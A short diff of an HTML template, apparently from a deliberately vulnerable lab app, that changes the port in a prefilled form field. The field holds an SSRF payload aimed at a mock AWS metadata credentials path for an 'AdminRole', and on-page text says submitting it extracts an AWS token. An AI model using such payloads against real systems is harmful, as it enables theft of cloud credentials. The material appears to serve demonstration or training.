@@ -36,7 +36,7 @@
         <form method="POST" action="/upload">
             <input type="hidden" name="from_dashboard" value="1">
             <input type="text" name="image_url" size="50" 
-                   value="http://localhost:8080/latest/meta-data/iam/security-credentials/AdminRole">
+                   value="http://localhost:8081/latest/meta-data/iam/security-credentials/AdminRole">
             <button type="submit">Fetch AWS Metadata</button>
         </form>
         <p><small>This will trigger SSRF and extract AWS token</small></p>
